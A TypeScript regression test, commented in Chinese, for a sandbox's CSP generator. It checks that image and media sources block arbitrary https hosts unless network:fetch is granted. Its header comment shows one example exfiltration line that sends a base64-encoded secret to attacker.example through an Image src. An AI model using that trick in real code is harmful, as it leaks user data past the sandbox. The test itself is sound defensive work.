/**
 * CSP 外泄通道回归测试。
 *
 * 沙箱一直宣称"禁止联网"：connect-src 'none'，fetch/XHR/WebSocket/EventSource
 * 全被包装层拿掉。但 img-src / media-src 里的裸 `https:` 对所有 Tapp 默认开启，
 * 而这就是一条完整可用的单向外泄通道：
 *
 *     new Image().src = 'https://attacker.example/?d=' + btoa(secret)
 *
 * 不需要读响应，请求发出去数据就走了。现在它挂在已有的 network:fetch 权限下。
 *
 * Run from frontend/:
 *   pnpm test:unit -- src/tapp/runtime/sandbox/cspExfiltration.test.ts
 */

/* eslint-disable test/no-import-node-test -- node:test; project has no vitest dep */

import assert from 'node:assert/strict'
import { describe, it } from 'node:test'

import { cspOptionsFromPermissions, generateCSP } from './security.ts'

/** 取出某条 directive 的完整文本。 */
function directive(csp: string, name: string): string {
  const found = csp
    .split(';')
    .map((d) => d.trim())
    .find((d) => d === name || d.startsWith(`${name} `))
  return found ?? ''
}

describe('generateCSP media directives', () => {
  it('does not allow arbitrary https images without network:fetch', () => {
    const csp = generateCSP('n0nce', cspOptionsFromPermissions([]))

    const img = directive(csp, 'img-src')
    assert.ok(img.length > 0, 'img-src must be present')
    assert.ok(
      !/\bhttps:/.test(img),
      `img-src must not allow bare https: by default; got "${img}"`,
    )
    assert.ok(img.includes('data:'), 'packaged/data URIs still allowed')
    assert.ok(img.includes('blob:'), 'blob URIs still allowed')

    const media = directive(csp, 'media-src')
    assert.ok(
      !/\bhttps:/.test(media),
      `media-src must not allow bare https: by default; got "${media}"`,
    )
  })

  it('allows https media once network:fetch is granted', () => {
    const csp = generateCSP('n0nce', cspOptionsFromPermissions(['network:fetch']))
    assert.ok(/\bhttps:/.test(directive(csp, 'img-src')))
    assert.ok(/\bhttps:/.test(directive(csp, 'media-src')))
  })

  it('keeps media:audio and network:fetch independent', () => {
    // media:audio 只放行 blob/data，不该顺带把远端 https 打开
    const audioOnly = generateCSP('n', cspOptionsFromPermissions(['media:audio']))
    const media = directive(audioOnly, 'media-src')
    assert.ok(media.includes('blob:'), 'media:audio grants blob:')
    assert.ok(
      !/\bhttps:/.test(media),
      `media:audio must not imply remote media; got "${media}"`,
    )
  })

  it('never relaxes the directives that make the sandbox a sandbox', () => {
    for (const perms of [[], ['network:fetch'], ['media:audio', 'network:fetch']]) {
      const csp = generateCSP('n0nce', cspOptionsFromPermissions(perms))
      assert.equal(directive(csp, 'connect-src'), "connect-src 'none'")
      assert.equal(directive(csp, 'worker-src'), "worker-src 'none'")
      assert.equal(directive(csp, 'frame-src'), "frame-src 'none'")
      assert.equal(directive(csp, 'object-src'), "object-src 'none'")
      assert.equal(directive(csp, 'form-action'), "form-action 'none'")
      assert.equal(directive(csp, 'base-uri'), "base-uri 'none'")
      // script-src 只认 nonce，不接受任何外部 host
      const script = directive(csp, 'script-src')
      assert.ok(script.includes("'nonce-n0nce'"))
      assert.ok(!script.includes('https:'), `script-src must stay nonce-only: ${script}`)
    }
  })
})
